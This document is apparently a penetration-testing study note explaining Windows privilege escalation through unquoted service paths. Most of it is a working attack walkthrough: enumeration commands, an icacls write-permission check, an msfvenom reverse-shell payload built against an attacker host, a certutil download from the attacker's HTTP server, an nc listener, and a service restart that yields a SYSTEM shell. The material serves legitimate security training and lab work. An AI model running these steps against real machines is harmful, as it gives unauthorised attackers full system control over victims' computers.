# 02 — Unquoted Service Path

## Background: How Windows Services Work

A Windows **Service** is like a Linux daemon — it runs in the background, often as SYSTEM or a high-privilege account, handling tasks like network connections, printing, database engines, etc.

When Windows starts a service, it reads the service's **binary path** (the location of the .exe file that runs the service) from the registry.

---

## The Vulnerability Explained

When a service executable path contains **spaces** and is **not enclosed in quotes**, Windows has to **guess** where the file is.

### Example:

A service has this path configured:
```
C:\Program Files\Vulnerable App\Service\service.exe
```

No quotes around it. It has spaces in the path (`Program Files`, `Vulnerable App`).

When Windows tries to start this service, it tries to find the executable by guessing at each space:

```
Attempt 1: C:\Program.exe                          → Does this exist?
Attempt 2: C:\Program Files\Vulnerable.exe         → Does this exist?
Attempt 3: C:\Program Files\Vulnerable App\Service.exe → Does this exist?
Attempt 4: C:\Program Files\Vulnerable App\Service\service.exe → Final try
```

**This is a Windows path resolution bug.** Windows tries each space-separated path from left to right.

---

## How We Exploit It

If we can **write a file** to any of those directories, we can place a malicious executable at one of the paths Windows tries before the real one.

For example, if we can write to `C:\Program Files\Vulnerable App\`, we create:
```
C:\Program Files\Vulnerable App\Service.exe  ← Our malicious payload
```

When the service starts, Windows finds **our file first** and executes it **as SYSTEM** (since the service runs as SYSTEM).

---

## Step 1 — Find Services with Unquoted Paths

### Method A: Command Prompt

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```

**Breaking down this command:**

| Part | Meaning |
|------|---------|
| `wmic service get ...` | Query Windows Management Instrumentation for service info |
| `name,displayname,pathname,startmode` | Get these specific fields |
| `\| findstr /i "auto"` | Filter: only show auto-start services (`/i` = case insensitive) |
| `\| findstr /i /v "c:\windows\\"` | Exclude (`/v` = invert) built-in Windows services |
| `\| findstr /i /v """"` | Exclude paths that already have quotes |

**Example output:**
```
VulnerableService   Vulnerable Svc   C:\Program Files\Vulnerable App\Service\service.exe   Auto
```

---

### Method B: PowerShell (More readable)

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} | Select-Object Name, PathName, StartMode
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `Get-WmiObject -Class Win32_Service` | Get all Windows services |
| `Where-Object {...}` | Filter results |
| `$_.PathName -notlike '"*'` | Path does NOT start with a quote |
| `-and $_.PathName -like '* *'` | Path DOES contain a space |
| `Select-Object Name, PathName, StartMode` | Show only these fields |

---

### Method C: sc qc (Query individual services)

```cmd
sc qc "ServiceName"
```

Look for `BINARY_PATH_NAME` in the output — if it has spaces and no quotes, it's vulnerable.

---

## Step 2 — Check Write Permissions on the Path

For each directory in the path, check if you can write to it:

```cmd
icacls "C:\Program Files\Vulnerable App"
```

**What `icacls` shows:**
```
C:\Program Files\Vulnerable App BUILTIN\Users:(OI)(CI)(W)
```

**Permission codes:**

| Code | Meaning |
|------|---------|
| `F` | Full control |
| `M` | Modify |
| `W` | Write |
| `R` | Read |
| `X` | Execute |
| `(OI)` | Object Inherit — subfiles inherit |
| `(CI)` | Container Inherit — subfolders inherit |

If `BUILTIN\Users` (or your specific user/group) has `W` or `M` or `F` — you can write there.

---

## Step 3 — Create Malicious Payload

Create a reverse shell executable using msfvenom (on Kali):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o Service.exe
```

**Important:** The filename must match what Windows expects at the vulnerable path.

For the example path `C:\Program Files\Vulnerable App\Service\service.exe`, Windows tries:
- `C:\Program Files\Vulnerable.exe`
- `C:\Program Files\Vulnerable App\Service.exe`  ← Place it here

So we name our file `Service.exe`.

---

## Step 4 — Transfer Payload to Target

```bash
# On Kali
python3 -m http.server 8080
```

```cmd
# On Windows target
certutil -urlcache -f http://KALI_IP:8080/Service.exe "C:\Program Files\Vulnerable App\Service.exe"
```

---

## Step 5 — Set Up Listener on Kali

```bash
nc -lvnp 4444
```

---

## Step 6 — Restart the Service

The malicious payload runs when the service starts. You can trigger this by:

### Option A: Restart the service (if you have permission)

```cmd
sc stop VulnerableService
sc start VulnerableService
```

### Option B: If you cannot restart the service, wait for system reboot

If the service is set to start automatically (`StartMode: Auto`), it will run on next reboot.

```cmd
shutdown /r /t 0
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `shutdown` | Windows shutdown command |
| `/r` | Restart (not shutdown) |
| `/t 0` | Wait 0 seconds before restarting |

> **Note:** In real pentests, don't reboot without permission — it disrupts service. In labs/exams, it's fine.

---

## Step 7 — Catch the Shell

When the service starts and runs your payload:

```
connect to [KALI_IP] from (UNKNOWN) [TARGET_IP] 52341
Microsoft Windows [Version 10.0.17763.107]

C:\Windows\system32>whoami
nt authority\system
```

---

## Full Practical Example

**Scenario:** You have a low-priv shell on a Windows machine.

```cmd
# Step 1: Find vulnerable services
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """"

# Output:
# VulnSvc    C:\Program Files\My App\Logs\logger.exe

# Step 2: Check write permissions
icacls "C:\Program Files\My App"
# Shows: BUILTIN\Users:(W)  ← We can write here

# Step 3: On Kali — create payload named "Logs.exe" (next space-separated part)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Logs.exe

# Step 4: Transfer
# (start http server on Kali, certutil download on target)

# Step 5: Place payload
# Copy Logs.exe to C:\Program Files\My App\Logs.exe

# Step 6: Listener on Kali
nc -lvnp 4444

# Step 7: Restart service
sc stop VulnSvc && sc start VulnSvc

# SYSTEM shell received on Kali
```

---

## Summary

```
1. Find unquoted paths:
   wmic service get name,pathname | findstr /v "C:\Windows" | findstr /v """"
   
2. Check write permissions:
   icacls "C:\target\directory"
   
3. Create payload (msfvenom) with correct name
4. Transfer and place in the writable directory
5. Set up listener: nc -lvnp 4444
6. Restart service: sc stop/start ServiceName
7. Catch SYSTEM shell
8. Verify: whoami → nt authority\system
```
